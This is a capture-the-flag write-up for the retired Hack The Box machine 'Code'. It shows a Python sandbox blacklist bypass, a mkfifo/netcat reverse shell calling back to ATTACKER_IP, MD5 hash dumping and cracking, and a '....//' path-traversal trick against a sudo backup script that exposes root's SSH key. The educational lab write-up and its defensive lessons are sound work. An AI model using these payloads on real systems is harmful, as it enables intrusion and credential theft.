---
title: "🐍 HTB Code Write-up"
name: Code
date: 2025-08-03
difficulty: Easy
os: Linux
skills: "Enumeration, Python Code Injection, Reverse Shell, Database Looting, Password Cracking, Privilege Escalation, Sudo Privilege Exploitation"
tools: "rustscan, nmap, revshells, nc, sqlite3, hashcat, ssh, scp, sudo"
published: true
---


![](images/Pasted%20image%2020250704150436.png)

## 🗂️ Summary

A tiny Python “scratch‑pad” exposed on port **5000** turned out to be a full‑blown shell dispenser. 

Enumeration showed only SSH and a Flask + Gunicorn **Python Code Editor** web app. Although the devs blocked obvious strings like `import`, `exec`, and `subprocess`, they forgot about the already‑imported `sys` and `io` modules. By pulling `subprocess` out of `sys.modules` (`sub=sys.modules["sub"+"process"]`) and sneaking in a reverse shell, I landed on the box as `app‑production`.

Looting the SQLite DB revealed Martin’s MD5 password, which was cracked to `nafeelswordsmaster`. 
SSHing in as Martin uncovered a `sudo`‑able backup script (`/usr/bin/backy.sh`) that trusted any `/home/` path after simple string replacements. A sneaky `/home/....//root` entry bypassed the filter, let me archive `/root`, and handed over the root user’s private SSH key. 

A quick `ssh -i` later, and `root.txt` was mine.  🎉

## ⌨️ Python Code Editor

### 🔎 Recon 

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 8.2
- `5000/tcp`: Gunicorn 20.0.4 - Python Code Editor web application

```
fcoomans@kali:~/htb/code$ rustscan -a 10.10.11.62 --tries 5 --ulimit 10000 -- -sCV -oA code_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.62:22
Open 10.10.11.62:5000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA code_tcp_all" on ip 10.10.11.62
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Nmap scan report for 10.10.11.62
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2025-07-04 10:37:35 SAST for 13s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrE0z9yLzAZQKDE2qvJju5kq0jbbwNh6GfBrBu20em8SE/I4jT4FGig2hz6FHEYryAFBNCwJ0bYHr3hH9IQ7ZZNcpfYgQhi8C+QLGg+j7U4kw4rh3Z9wbQdm9tsFrUtbU92CuyZKpFsisrtc9e7271kyJElcycTWntcOk38otajZhHnLPZfqH90PM+ISA93hRpyGyrxj8phjTGlKC1O0zwvFDn8dqeaUreN7poWNIYxhJ0ppfFiCQf3rqxPS1fJ0YvKcUeNr2fb49H6Fba7FchR8OYlinjJLs1dFrx0jNNW/m3XS3l2+QTULGxM5cDrKip2XQxKfeTj4qKBCaFZUzknm27vHDW3gzct5W0lErXbnDWQcQZKjKTPu4Z/uExpJkk1rDfr3JXoMHaT4zaOV9l3s3KfrRSjOrXMJIrImtQN1l08nzh/Xg7KqnS1N46PEJ4ivVxEGFGaWrtC1MgjMZ6FtUSs/8RNDn59Pxt0HsSr6rgYkZC2LNwrgtMyiiwyas=
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiXZTkrXQPMXdU8ZTTQI45kkF2N38hyDVed+2fgp6nB3sR/mu/7K4yDqKQSDuvxiGe08r1b1STa/LZUjnFCfgg=
|   256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8Cwf2cBH9EDSARPML82QqjkV811d+Hsjrly11/PHfu
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `code.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/code$ grep code.htb /etc/hosts
10.10.11.62     code.htb
```

I open the site at http://code.htb:5000 and find the Python Code Editor web application.  You can enter Python code in the left panel, and the code is executed when the `Run` button is clicked, and the output is displayed in the right panel.

![](images/Pasted%20image%2020250704145211.png)

`import` is blocked, which means there is a blacklist that prevents the user from abusing the system.
Printing the Python `globals()`,

![](images/Pasted%20image%2020250704145254.png)

Shows various Python strings, functions and modules that can be used.
`io` and `sys` are already imported and are goldmines for abuse.
```
['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'Flask', 'render_template', 'render_template_string', 'request', 'jsonify', 'redirect', 'url_for', 'session', 'flash', 'SQLAlchemy', 'sys', 'io', 'os', 'hashlib', 'app', 'db', 'User', 'Code', 'index', 'register', 'login', 'logout', 'run_code', 'load_code', 'save_code', 'codes', 'about']
```

Printing the `sys.modules` in BURP shows all the available modules.  The application is also listed under `/home/app-production/app/app.py`.
`sys.modules` exposes already-imported modules, so even blacklisted imports can be bypassed via string trickery.

![](images/Pasted%20image%2020250704145614.png)

Using the enumerable `io.FileIO` to read the `/home/app-production/app/app.py` file using tuple comprehension and join,

```
print(''.join(line.decode() for line in io.FileIO('/home/app-production/app/app.py','r')))
```

Prints the content of the application file.

![](images/Pasted%20image%2020250704145806.png)

Copying the output text and then running `print(text)` (where text is the output text from the response in BURP) displays the application source code in a readable format.

Lines 76-91 show the function used to run the Python code.  As expected, it contains a blacklist of words that cannot be used.

```python
    76  @app.route('/run_code', methods=['POST'])
    77  def  run_code():
    78      code = request.form['code']
    79      old_stdout = sys.stdout
    80      redirected_output = sys.stdout = io.StringIO()
    81      try:
    82          for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess', '__import__', '__builtins__']:
    83              if keyword in code.lower():
    84                  return jsonify({'output': 'Use of restricted keywords is not allowed.'})
    85          exec(code)
    86          output = redirected_output.getvalue()
    87      except Exception as e:
    88          output = str(e)
    89      finally:
    90          sys.stdout = old_stdout
    91      return jsonify({'output': output})
```

The keywords that are blacklisted are:

```python
['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess', '__import__', '__builtins__']
```

### 🧪 Exploitation

But the devs made a fatal mistake in not adding `io` (which I used to get the source code and to read other files) and `sys` to the blacklist.
`sub=sys.modules["sub"+"process"]` is similar to `import subprocess as sub`, but provides the advantage of string concatenation of `subprocess` to bypass the blacklist.
From here any command can be run using `subprocess`.
I run the `id` command,

```python
cmd=["id",]
sub=sys.modules["sub"+"process"]
print(sub.run(cmd,capture_output=True,text=True).stdout)
```

And see that the `app-production` user is running the web application process.

![](images/Pasted%20image%2020250704150001.png)

#### 👣 Foothold as app-production

https://www.revshells.com is used to generate a `nc mkfifo` reverse shell payload.

![](images/Pasted%20image%2020250704150100.png)

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/code$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

And `bash` is used to run the reverse shell payload command (`-c`).

```python
cmd=["bash","-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"]
sub=sys.modules["sub"+"process"]
print(sub.run(cmd,capture_output=True,text=True).stdout)
```

The `nc` listener catches the reverse shell.

```
fcoomans@kali:~/htb/code$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.62] 39480
bash: cannot set terminal process group (30407): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$ id
id
uid=1001(app-production) gid=1001(app-production) groups=1001(app-production)
```

### 💰 Post Exploitation

#### 🚩 user.txt

`app-production` holds the `user.txt` flag.

```
app-production@code:~$ cat user.txt
cat user.txt
5baa3f27eea3d5179ee51eca28a44eaf
```

#### 🔼 Priv Esc to Martin

On line 10 of `/home/app-production/app/app.py`, it shows that a SQLite `database.db` file is used by the Python Code Editor web application.

```python
    10  app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
```

The database is found under `instance/database.db`.

```
app-production@code:~/app$ find . -name database.db
find . -name database.db
./instance/database.db
```

Python's `pty` module is used to spawn an interactive `bash` shell.

```
app-production@code:~/app$ python3 -c "import pty; pty.spawn('/bin/bash')"
python3 -c "import pty; pty.spawn('/bin/bash')"
```

The database is then accessed using `sqlite3` and queried to reveal two MD5 password hashes.

```
app-production@code:~/app$ sqlite3 instance/database.db
sqlite3 instance/database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
.tables
code  user
sqlite> .schema user
.schema user
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password VARCHAR(80) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
sqlite> select * from user;
select * from user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
sqlite> .exit
.exit
```

The only other user with shell access is user Martin.

```
app-production@code:~/app$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
app-production:x:1001:1001:,,,:/home/app-production:/bin/bash
martin:x:1000:1000:,,,:/home/martin:/bin/bash
```

`hashcat` cracks Martin's password hash.  The password is `nafeelswordsmaster`.
The use of MD5 in the user database meant password hashes could be cracked almost instantly with `hashcat`.

```
fcoomans@kali:~/htb/code$ hashcat -m 0 3de6f30c4a09c27fc71932bfc68474be /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)

<SNIP>
```

This lets me pivot to SSH using `martin` and password `nafeelswordsmaster`

```
fcoomans@kali:~/htb/code$ ssh martin@code.htb
martin@code.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

<SNIP>

martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
```

## 🍀 sudo backy to the future ... I mean to root

### 🔎 Recon 

Martin can run `/usr/bin/backy.sh` using `sudo`.

```
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

`backy.sh` reads a JSON settings file and then runs a backup based on settings in the JSON file.
Looking at `/usr/bin/backey.sh` on lines 15 and 17, I notice that only paths starting with `/var/` and `/home/` are allowed and `../` is replaced with an empty string to prevent path traversal.

```bash
    15  allowed_paths=("/var/" "/home/")
    16
    17  updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

A sample of a backup file can be found under `backups/task.json`.

```json
martin@code:~$ cat backups/task.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
```

### 🧪 Exploitation

I copied `task.json` to `task2.json` and changed the directory to be backed up to `/home/....//root`.  
The path `/home/....//root` bypasses the filter by evading the naive `../` removal logic, resolving to `/root` after normalization.

```
martin@code:~/backups$ cat task2.json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/....//root"
        ]
}
```

`sudo` is used to run the `task2.json` backup using `/usr/bin/backy.sh`.

```
martin@code:~/backups$ sudo /usr/bin/backy.sh task2.json
2025/07/04 12:42:10 🍀 backy 1.2
2025/07/04 12:42:10 📋 Working with task2.json ...
2025/07/04 12:42:10 💤 Nothing to sync
2025/07/04 12:42:10 📤 Archiving: [/home/../root]
2025/07/04 12:42:10 📥 To: /home/martin/backups ...
2025/07/04 12:42:10 📦
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  code_home_.._root_2025_July.tar.bz2  home  root  task2.json  task.json
```

`scp` is used to copy the backup file to the attack host.

```
fcoomans@kali:~/htb/code$ scp martin@code.htb:~/backups/code_home_.._root_2025_July.tar.bz2 loot
martin@code.htb's password:
code_home_.._root_2025_July.tar.bz2                100%   13KB  36.3KB/s   00:00
```

The backed up files are listed, and I see that root has a private `id_rsa` SSH key.

```
fcoomans@kali:~/htb/code$ cd loot

fcoomans@kali:~/htb/code/loot$ tar tvf code_home_.._root_2025_July.tar.bz2
drwx------ root/root         0 2025-07-04 09:19 root/
drwxr-xr-x root/root         0 2024-07-28 00:29 root/.local/
drwx------ root/root         0 2024-07-28 00:29 root/.local/share/
drwx------ root/root         0 2024-08-26 21:11 root/.local/share/nano/
-rw------- root/root       101 2024-08-27 05:59 root/.local/share/nano/search_history
-rw-r--r-- root/root        66 2025-04-09 13:27 root/.selected_editor
lrwxrwxrwx root/root         0 2024-07-27 17:12 root/.sqlite_history -> /dev/null
-rw-r--r-- root/root       161 2019-12-05 16:39 root/.profile
drwxr-xr-x root/root         0 2025-04-09 13:26 root/scripts/
-rwxr-xr-x root/root       266 2025-04-09 13:26 root/scripts/cleanup.sh
drwxr-xr-x root/root         0 2024-09-16 07:09 root/scripts/backups/
-rw-r--r-- root/root       181 2024-08-27 05:04 root/scripts/backups/task.json
-rw-r--r-- root/root      5879 2024-08-27 05:04 root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
-rw-r--r-- root/root     16384 2024-08-26 21:51 root/scripts/database.db
-rwxr-xr-x root/root       210 2024-08-27 05:46 root/scripts/cleanup2.sh
lrwxrwxrwx root/root         0 2024-07-27 17:12 root/.python_history -> /dev/null
-rw-r----- root/root        33 2025-07-04 09:19 root/root.txt
drwx------ root/root         0 2024-08-27 05:20 root/.cache/
-rw-r--r-- root/root         0 2024-08-27 05:20 root/.cache/motd.legal-displayed
drwx------ root/root         0 2024-08-27 04:26 root/.ssh/
-rw------- root/root      2590 2024-08-27 04:25 root/.ssh/id_rsa
-rw-r--r-- root/root       563 2024-08-27 04:25 root/.ssh/authorized_keys
lrwxrwxrwx root/root         0 2024-07-27 17:12 root/.bash_history -> /dev/null
-rw-r--r-- root/root      3106 2019-12-05 16:39 root/.bashrc
```

The file is extracted.

```
fcoomans@kali:~/htb/code/loot$ tar xvf root.tar.bz2 root/.ssh/id_rsa
root/.ssh/id_rsa
```

And used to gain `root` access.

```
fcoomans@kali:~/htb/code/loot$ ssh -i root/.ssh/id_rsa root@code.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

<SNIP>

root@code:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 💰 Post Exploitation

#### 🏆 root.txt flag

`root` is the holder of the `root.txt` flag.

```
root@code:~# cat root.txt
effc8dba379c6829d2e95f0e2fcec82a
```

When you let anyone run code on your server… don’t be surprised when someone does. 🧑‍💻🚀

And `Code has been Pwned!` 🎉

![](images/Pasted%20image%2020250704150550.png)

## 📚 Lessons Learned

- **Blacklists != security:** 
	Relying on a word blacklist misses edge cases (e.g., pulling modules from `sys.modules`) and gives a false sense of safety. Use proper sand‑boxing or container isolation for untrusted code.
- **Assume loaded modules are fair game:** 
	If dangerous modules are already imported, they’re reachable without `import`. Whitelist what _is_ allowed rather than trying to predict every bad keyword.
- **Validate _and_ canonicalise paths:** 
	Simply removing “../” isn’t enough. Use `os.path.realpath` and enforce that the final resolved path stays within an allowed directory.
- **Principle of least privilege:** 
	The backup script didn’t need full root access. A dedicated service account with constrained ACLs would have contained the blast radius.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
